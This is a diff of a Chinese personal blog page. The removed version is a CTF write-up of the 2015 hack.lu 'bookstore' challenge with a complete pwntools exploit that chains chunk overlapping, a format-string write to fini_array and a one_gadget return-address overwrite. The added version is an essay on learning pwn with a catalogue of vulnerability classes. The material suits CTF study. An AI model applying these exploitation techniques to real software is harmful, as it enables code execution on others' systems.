@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="堆的利用（chunk_overlapping）,">
+  <meta name="keywords" content="pwn基础,小心得,">
 
 
 
@@ -84,25 +84,20 @@
 
 
 
-<meta name="description" content="首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所">
-<meta name="keywords" content="堆的利用（chunk_overlapping）">
+<meta name="description" content="前言：这算是写给自己看的一篇水文，呃，暑假也快过完了。。。各种大型比赛的题，来源奇怪的题也刷了不少了。。。但总感觉自己遇到了瓶颈。。。具体说也说不上来。。。虽然在跟着天枢打比赛，但是感觉个人能力没有在很高效地提升，这样下去以后很难独当一面，顶起战队的大梁。。我静下心想了半天。。觉得自己遇到瓶颈的原因主要有以下几个方面：  太把自己局限在比赛里，无论是作为同龄人中翘楚的白神还是队里的研究生师傅，他们">
+<meta name="keywords" content="pwn基础,小心得">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2015-hacklu-bookstore">
-<meta property="og:url" content="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/index.html">
+<meta property="og:title" content="小心得2">
+<meta property="og:url" content="http://yoursite.com/2019/08/18/小心得2/index.html">
 <meta property="og:site_name" content="xiaoxiaorenwu">
-<meta property="og:description" content="首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所">
+<meta property="og:description" content="前言：这算是写给自己看的一篇水文，呃，暑假也快过完了。。。各种大型比赛的题，来源奇怪的题也刷了不少了。。。但总感觉自己遇到了瓶颈。。。具体说也说不上来。。。虽然在跟着天枢打比赛，但是感觉个人能力没有在很高效地提升，这样下去以后很难独当一面，顶起战队的大梁。。我静下心想了半天。。觉得自己遇到瓶颈的原因主要有以下几个方面：  太把自己局限在比赛里，无论是作为同龄人中翘楚的白神还是队里的研究生师傅，他们">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1f93c31b73.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c98983d.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c98799c.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c978e15.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca22b487c554.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca22f5ebf0bd.png">
-<meta property="og:updated_time" content="2019-04-01T15:50:06.270Z">
+<meta property="og:image" content="https://i.loli.net/2019/08/18/ZjUr9hLiM37vuCN.png">
+<meta property="og:updated_time" content="2019-08-18T08:25:44.339Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2015-hacklu-bookstore">
-<meta name="twitter:description" content="首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所">
-<meta name="twitter:image" content="https://i.loli.net/2019/04/01/5ca1f93c31b73.png">
+<meta name="twitter:title" content="小心得2">
+<meta name="twitter:description" content="前言：这算是写给自己看的一篇水文，呃，暑假也快过完了。。。各种大型比赛的题，来源奇怪的题也刷了不少了。。。但总感觉自己遇到了瓶颈。。。具体说也说不上来。。。虽然在跟着天枢打比赛，但是感觉个人能力没有在很高效地提升，这样下去以后很难独当一面，顶起战队的大梁。。我静下心想了半天。。觉得自己遇到瓶颈的原因主要有以下几个方面：  太把自己局限在比赛里，无论是作为同龄人中翘楚的白神还是队里的研究生师傅，他们">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/18/ZjUr9hLiM37vuCN.png">
 
 
 
@@ -132,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/18/小心得2/">
 
 
 
 
 
-  <title>2015-hacklu-bookstore | xiaoxiaorenwu</title>
+  <title>小心得2 | xiaoxiaorenwu</title>
   
 
 
@@ -307,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/18/小心得2/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -324,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2015-hacklu-bookstore</h1>
+          <h1 class="post-title" itemprop="name headline">小心得2</h1>
         
 
         <div class="post-meta">
@@ -336,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T19:37:35+08:00">
-                2019-04-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-18T16:23:49+08:00">
+                2019-08-18
               </time>
             
 
@@ -347,28 +342,6 @@
           </span>
 
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf-writeups/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf-writeups</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -377,8 +350,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/04/01/2015-hacklu-bookstore/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/01/2015-hacklu-bookstore/" itemprop="commentCount"></span>
+                <a href="/2019/08/18/小心得2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/18/小心得2/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -405,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.7k
+                  2k
                 </span>
               
 
@@ -442,57 +415,54 @@
       
 
       
-        <p>首先提供题目的二进制文件：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore" target="_blank" rel="noopener">2015_hacklu</a></p>
-<h2 id="预览："><a href="#预览：" class="headerlink" title="预览："></a>预览：</h2><p><img src="https://i.loli.net/2019/04/01/5ca1f93c31b73.png" alt=""></p>
-<p>程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能：</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca225c98983d.png" alt=""></p>
-<p>可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca225c98799c.png" alt=""></p>
-<p>这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca225c978e15.png" alt=""></p>
-<p>可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符串中。</p>
-<p>接着往下看，看完后发现实际上程序功能很简单，就两个小功能，一个输入任意字节的输入功能，一个free()功能（uaf没什么用。）。</p>
-<p>暂时有用的漏洞就是<strong>格式化字符串漏洞</strong>和<strong>任意溢出漏洞</strong>。</p>
-<h2 id="漏洞如何利用："><a href="#漏洞如何利用：" class="headerlink" title="漏洞如何利用："></a>漏洞如何利用：</h2><ol>
-<li><p>以格式化字符串漏洞为主线索来逆向推理分析，<strong>如何控制dest？？？</strong>，我们发现程序中好像没有可以控制dest的功能（任意溢出漏洞虽然可以覆盖到，但是之后dest会被更新为固定的字符串）。。。真让人头秃，只有自己构造了。。。。然后发现最后一个功能里的v5指向的chunk的位置还未固定（malloc()从bins里找chunk，而bins里的chunk是可控的），所以我们可以利用任意溢出漏洞更改v7指向的chunk的大小为0x150，然后free()，再通过程序的malloc(0x140)来实现chunkoverlapping，从而使v5指向的地址位于dest地址前面，然后利用填充v5的机会构造dest。这里还需要注意的地方是free(2)的时候，因为大小属于small chunk所以会有两道检查，一个是防止和后一块合并，所以必须伪造后后一块，并使其prev_inuse位为1，另一个是后一块的prev_inuse位要为1。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca22b487c554.jpg" alt=""></p>
-</li>
-<li><p>相信大家都能注意到，就是程序运行了一次就结束了，而我们至少需要两次运行，一次leak，一次change，所以这里需要利用第一次的机会来将fini_arry0改为main_addr，并且泄露libc地址（main函数返回到__libc_start_main中，可以在格式化字符串前来下断点，通过查看栈的数据来查看偏移，进而获得libc地址。），现在还有一个问题是fini_arry0怎么输入进栈并且确定偏移？？？这里需要打破常规思维，<strong>需要改的数据可以不在格式化字符串里，只要偏移可以确定就行！</strong>，这时候就想到了之前的那个s给了0x80的空间，我们可以将fini_arry0输入到s里然后通过调试确定偏移。</p>
-</li>
-<li><p>如果我们这时候继续往下做的时候做到最后会发现一个问题：改过got表之后程序已经几乎结束，不会再调用函数了，所以改了也没用，所以我们只能改main函数返回地址为one_gadget了，这时候我们就要确定泄露一个和返回地址的地址相对偏移不变的值，经过观察发现有一个存在，然后泄露他。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca22f5ebf0bd.png" alt=""></p>
-</li>
-<li><p>第二次返回时我们的任务就变成了改ret_addr为one_gadget即可。只需要改后面的三个字节即可（可通过调试发现）。</p>
-</li>
-</ol>
-<h2 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">'./books'</span>)</span><br><span class="line">P=ELF(<span class="string">'./books'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400c8e')</span></span><br><span class="line"><span class="comment">#创建各个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,des)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.recvuntil(<span class="string">'er:\n'</span>)</span><br><span class="line">	p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(ID+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先构造chunk1造成over lapping 并且构造dest  两个目的：1.泄露__libc_main_ret</span></span><br><span class="line"><span class="comment">#2.将fini_arry0改为main_addr</span></span><br><span class="line">fini_arry0=<span class="number">0x6011b8</span>  <span class="comment">#0x400830</span></span><br><span class="line">main_addr=<span class="number">0x400a39</span></span><br><span class="line">payload = <span class="string">'%'</span>+str(<span class="number">0xa39</span>)+<span class="string">'c%13$hn'</span>+<span class="string">'.%31$p'</span>+<span class="string">',%28$p'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= p64(<span class="number">0x90</span>)</span><br><span class="line">payload+= p64(<span class="number">0x151</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x140</span></span><br><span class="line">payload+= p64(<span class="number">0x150</span>)              </span><br><span class="line">payload+= p64(<span class="number">0x21</span>)               <span class="comment">#为了bypass the check: !prev_inuse(next_chunk)</span></span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload+= p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)     <span class="comment">#为了使0x150的块不和nextchunk合并  </span></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">submit(<span class="string">'aaaaaaa'</span>+p64(fini_arry0))</span><br><span class="line"><span class="comment">#submit('aaaaaaa')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">date = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">','</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">date =int(date,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = int(ret_addr,<span class="number">16</span>) - <span class="number">0xd8</span> <span class="number">-0x110</span></span><br><span class="line">libcbase = date - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0x45216</span>  <span class="comment">#0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">log.success(<span class="string">'ret_addr = '</span> + hex(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">one_shot1 =<span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-2</span>:]</span><br><span class="line">one_shot2 =<span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-6</span>:<span class="number">-2</span>]</span><br><span class="line">one_shot1 = int(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = int(one_shot2,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(one_shot1) + <span class="string">'d%13$hhn'</span></span><br><span class="line">payload+= <span class="string">'%'</span> + str(one_shot2-one_shot1) + <span class="string">'d%14$hn'</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=p64(<span class="number">0x151</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x140</span></span><br><span class="line">payload+= p64(<span class="number">0x150</span>)</span><br><span class="line">payload+= p64(<span class="number">0x21</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">submit(<span class="string">'aaaaaaa'</span>+p64(ret_addr)+p64(ret_addr+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="我第一次做的时候的一些心得："><a href="#我第一次做的时候的一些心得：" class="headerlink" title="我第一次做的时候的一些心得："></a>我第一次做的时候的一些心得：</h2><h3 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015_hacklu_bookstore:"></a>2015_hacklu_bookstore:</h3><ul>
-<li><p>这一题看似漏洞较多，但实际上难度不小，而且知识比较综合（有格式化字符串，堆栈的结合，overlapping，uaf等），利用起来很困难，费了很大劲才弄懂exp。还要感谢看雪的师傅。</p>
-</li>
-<li><p>学到的东西：</p>
-</li>
-<li><ol>
-<li><p>使程序再次运行的方法：改写fini_arry0的内容（一般在.fini_arry段中，在ida中ctrl+s寻找位置）为main_addr，可以再次运行，但只能用一次。 </p>
-</li>
-<li><p>ida中使数字解析为字符串的方法，按r即可。</p>
-</li>
-<li><p>free(fast_bin（64位的极限是0x70）)时不需检查，而free(small_bin(64位是大于等于0x80))时，需要考虑几个因素：</p>
-<p>@1有可能会需要占位的堆块，防止被top chunk合并。                                                                                      </p>
-<p>@2可能会造成unlink效应，注意构造时的size的inuse位，检查prev_chunk的占用情况，如果要unlink，两个堆块都要在small_bin的范围内。                                                                                                                                              @3会检查next_chunk(prev_inuse)的值是否为1,而next_chunk_addr=chunk_addr+chunk_size，chunk_size为自己构造，需注意。</p>
-</li>
-</ol>
-</li>
-<li><p>利用overlapping构造格式化字符串来造成任意读写，得知偏移后提前构造栈的结构。</p>
-</li>
-<li><p>当通过格式化字符串获取任意写的功能时，除了向got表内写，还可以改写函数的返回地址为one_gadget（当然不一定能成功），这时就需要获取返回地址的地址，也就是栈中的某一个的地址，一般需要通过观察栈中数据是否有指向栈的并且和返回地址有固定的偏移，泄露其数值加上偏移即可得到返回地址的地址。</p>
-</li>
-<li><p>格式化字符串用%p打印出来的内容无需解包直接接受即可（所有内容都是字符，比如：0x600124则需要data=int(p.recv(8),16)），%s需要解包(接受时是以字符接受的，0x600124为data=u64(p.recv()[0:3].ljust(8,’\x00’)))。</p>
-</li>
-<li><p>[-2:]和[-2:0]的区别。。。</p>
-</li>
-<li><p>当利用改fini_arry0为main_addr而使程序再次回到开头时，程序的两次返回地址之间有一个固定的偏移。</p>
-</li>
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这算是写给自己看的一篇水文，呃，暑假也快过完了。。。各种大型比赛的题，来源奇怪的题也刷了不少了。。。但总感觉自己遇到了瓶颈。。。具体说也说不上来。。。虽然在跟着天枢打比赛，但是感觉个人能力没有在很高效地提升，这样下去以后很难独当一面，顶起战队的大梁。。我静下心想了半天。。觉得自己遇到瓶颈的原因主要有以下几个方面：</p>
+<ul>
+<li>太把自己局限在比赛里，无论是作为同龄人中翘楚的白神还是队里的研究生师傅，他们都有过丰富的挖洞和调试1day的经验，有过实战经验且知识面极广，知识面广了做ctf时思路才能广和灵活，而我却连挖洞都不会。。。基础的计算机学科的知识也不会多少，因为大二都没开始，专业课都几乎没上。。而且一点实战经验没有。。导致我做题时的思路比较狭隘和保守，只能在那一小块技巧里扣，没法放大了去观察。。。</li>
+<li>基础不扎实，需要巩固基础，二进制的基础有啥呢，目前我接触到的，也就只有汇编，ELF文件结构，glibc内存管理。。这三个东西搞扎实了。。国内百分之70的pwn你可以随便秒了。。但是搞扎实还是蛮难的，glibc内存管理想吃透起码得两三周，还得复习，还要考虑不同的glibc版本。。。。<strong>耐下心来看书是一件很可贵的事情。。看书不像刚开始入门时刷题那样来的快，但却是想要进阶的必要条件</strong>，这是我的感触，可能每个人感觉不一样，包括一个ELF文件载入内存的过程具体是怎么样的，动态链接是怎么实现的，能不能张口就来，malloc的chunk从哪来，free的chunk去哪了，能不能不调试就了然于胸？队长做技巧pwn都不用调试，直接写exp直接打，这也是为啥天枢一些技巧题总是拿一血，因为他太熟了，对每个chunk的来去都了然于胸。。。不像我还得写一步调试一步，看chunk构造的结构有没有错。。。大大降低了效率。</li>
+<li>心态问题，没进天枢之前，我可以问问题的师傅很少，大部分都是自己想的，自己慢慢调，有时候一题想个几天。。但是进了天枢以后，感觉个人能力反而在下降。。有时候想个半小时没思路就去问队里师傅们。。。打比赛也因为想着反正我会的大佬们也肯定会，我就划划水就行了。。。锻炼的效果不是很好。。。Anciety师傅说过一句话我觉得很有道理：<strong>如果这道题不限制时间，你能不能做出来？</strong>，其实比赛没必要这么紧张，完全可以把他当作复现，耐下心来看，进下心调。</li>
 </ul>
+<h1 id="我个人对题目的等级划分："><a href="#我个人对题目的等级划分：" class="headerlink" title="我个人对题目的等级划分："></a>我个人对题目的等级划分：</h1><p>初级题：洞不难找，考察简单的堆或者栈的利用技巧，可能会有一点小坑。</p>
+<p>中级题：</p>
+<ol>
+<li>中级技巧题：题目逻辑不复杂，找洞难度一般，但是利用链非常长，会综合很多已出现的利用技巧，有坑（例如比较难找的gagdets。）例如：2019DelCTF-unprintable。</li>
+<li>中级分析题：题目逻辑复杂，洞较难找，利用大多是利用程序本身自带的功能而非平时所见到的技巧，需要把程序吃透。例如：2019强网杯-babycpp。</li>
+</ol>
+<p>高级题/压轴题：</p>
+<ol>
+<li>高级技巧题：市面上还没出现的新的技巧，一般市面上的技巧第一次出现都是高级压轴题，第二次就是初级和中级题了，例如：2019Hitcon-house of orange。</li>
+<li>高级分析题：国外貌似基本都是这种题，类似于数学里的新定义运算，让你去学习一个新东西，然后熟悉他了解他最后pwn他，让你在做题时能学到知识。模拟内存管理，模拟cpu。。都属于这一种</li>
+</ol>
+<p>以上为简单的划分，不可能精确到每道题按号入座。。。。</p>
+<p>之前和队长交流，他说常规的二进制漏洞就这么多，实在找不到洞就一个一个对。。所以我在这里把见过的洞都整理一下。</p>
+<h1 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h1><h2 id="溢出类漏洞："><a href="#溢出类漏洞：" class="headerlink" title="溢出类漏洞："></a>溢出类漏洞：</h2><p>溢出类漏洞是我们接触pwn最先接触到的漏洞，相信大家都是从基础栈溢出开始入门pwn的，虽然溢出漏洞是最常见的漏洞，但我个人感觉其实它也是最深邃的一类漏洞，很多难题都是最终都是溢出的漏洞，只是被复杂的程序逻辑隐藏而不易发现，或者需要很复杂的构造和触发条件。</p>
+<h3 id="栈溢出："><a href="#栈溢出：" class="headerlink" title="栈溢出："></a>栈溢出：</h3><p>形式较多，但<strong>本质：从一个栈变量的输入可以修改另外一个栈变量（或者函数返回地址和rbp）,进而产生因栈变量改变而产生的其他漏洞。比如函数指针列表的index存在栈上，栈溢出改index再进行下数组标溢出。</strong></p>
+<h3 id="堆溢出："><a href="#堆溢出：" class="headerlink" title="堆溢出："></a>堆溢出：</h3><p>形式较多，但<strong>本质：从一个堆块的输入可以修改另外一个堆块的关键位置（size位，fd位，bk位，nextfd位，nextbk位，prev_size位算一半吧。。）或者content</strong></p>
+<h3 id="整数溢出-字符溢出："><a href="#整数溢出-字符溢出：" class="headerlink" title="整数溢出/字符溢出："></a>整数溢出/字符溢出：</h3><p>无论是字符溢出还是整数溢出，<strong>我觉得我们的本质的目的是想让一个数/字符，不断增大，不断增大，不断增大，然后突然变得极小，然后再对这个本应是很大的数所操纵的内存进行大数据填充，形成溢出</strong>，常见的比如：chunk的size位整数溢出，还有一种情况是利用signed int向unsigned int（size_t）强转时产生的：例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size;</span><br><span class="line">scanf('%d',&amp;size);</span><br><span class="line">ptr = <span class="built_in">malloc</span>(size+<span class="number">8</span>);</span><br><span class="line">read(<span class="number">0</span>,ptr,size);</span><br></pre></td></tr></table></figure>
+<p>如果我们输入size为负数时就会发生堆溢出。因为malloc(size_t  a1)；    read(FILE<em>  fd，void</em>  p，size_t  a1)。size_t为unsigned int型，所以强转时会产生漏洞。</p>
+<h3 id="数组下标缺失检查"><a href="#数组下标缺失检查" class="headerlink" title="数组下标缺失检查"></a>数组下标缺失检查</h3><ul>
+<li>堆块指针列表</li>
+<li>函数指针列表</li>
+<li>堆块size列表</li>
+<li>结构体列表</li>
+<li>题目自定义列表</li>
+</ul>
+<h3 id="空间复用："><a href="#空间复用：" class="headerlink" title="空间复用："></a>空间复用：</h3><ul>
+<li>多线程时见过两次，国外题见过一次。<strong>常见的情景就是程序内存（或者是自定义的某个东西）空间不足了，所以之后的内存要和之前已经分配出去的内存共用。</strong></li>
+</ul>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="逻辑类漏洞："><a href="#逻辑类漏洞：" class="headerlink" title="逻辑类漏洞："></a>逻辑类漏洞：</h2><h3 id="条件竞争："><a href="#条件竞争：" class="headerlink" title="条件竞争："></a>条件竞争：</h3><h3 id="运算符优先级："><a href="#运算符优先级：" class="headerlink" title="运算符优先级："></a>运算符优先级：</h3><h3 id="状态检查："><a href="#状态检查：" class="headerlink" title="状态检查："></a>状态检查：</h3><ul>
+<li>对一块内存进行使用时，是否进行了状态检查，（不要忽略程序自定义的状态检查。）</li>
+</ul>
+<h2 id="极端情况漏洞："><a href="#极端情况漏洞：" class="headerlink" title="极端情况漏洞："></a>极端情况漏洞：</h2><h3 id="极大："><a href="#极大：" class="headerlink" title="极大："></a>极大：</h3><ul>
+<li>分配的size大小无检测，可以对topchunk进行操作，也可以整数溢出。</li>
+</ul>
+<h3 id="极小："><a href="#极小：" class="headerlink" title="极小："></a>极小：</h3><ul>
+<li>分配的size大小无检测，可以分配0字节，进行泄露，还可以利用0x0，0x8，0x10，0x18都分配0x20大小的chunk这一点。</li>
+</ul>
+<h2 id="库函数自身漏洞："><a href="#库函数自身漏洞：" class="headerlink" title="库函数自身漏洞："></a>库函数自身漏洞：</h2><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><h3 id="printf-chk"><a href="#printf-chk" class="headerlink" title="__printf_chk"></a>__printf_chk</h3><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><h3 id="abs"><a href="#abs" class="headerlink" title="abs"></a>abs</h3><h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><h3 id="strchr"><a href="#strchr" class="headerlink" title="strchr"></a>strchr</h3><h2 id="其他（算是特点，不算是漏洞了其实）："><a href="#其他（算是特点，不算是漏洞了其实）：" class="headerlink" title="其他（算是特点，不算是漏洞了其实）："></a>其他（算是特点，不算是漏洞了其实）：</h2><h3 id="类编辑操作次数不限："><a href="#类编辑操作次数不限：" class="headerlink" title="类编辑操作次数不限："></a>类编辑操作次数不限：</h3><p>常见的有堆题的upgrade功能，有的逻辑复杂的程序会自定义类编辑操作，如果次数不限的话，就很好用，哪怕一次只能对一个字节进行操作，1 * 无限 = 无限。</p>
+<h3 id="无干扰字符："><a href="#无干扰字符：" class="headerlink" title="无干扰字符："></a>无干扰字符：</h3><p>可以输入空，也就是碰到回车直接返回不会补零干扰content，这是一个很方便的点。</p>
+<p>最后，学无止境，你我共勉：</p>
+<p><img src="https://i.loli.net/2019/08/18/ZjUr9hLiM37vuCN.png" alt="PWN.png"></p>
 
       
     </div>
@@ -542,7 +512,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://xiaoxiaorenwu.top/2019/04/01/2015-hacklu-bookstore/" title="2015-hacklu-bookstore">https://xiaoxiaorenwu.top/2019/04/01/2015-hacklu-bookstore/</a>
+    <a href="https://xiaoxiaorenwu.top/2019/08/18/小心得2/" title="小心得2">https://xiaoxiaorenwu.top/2019/08/18/小心得2/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -557,7 +527,9 @@
       
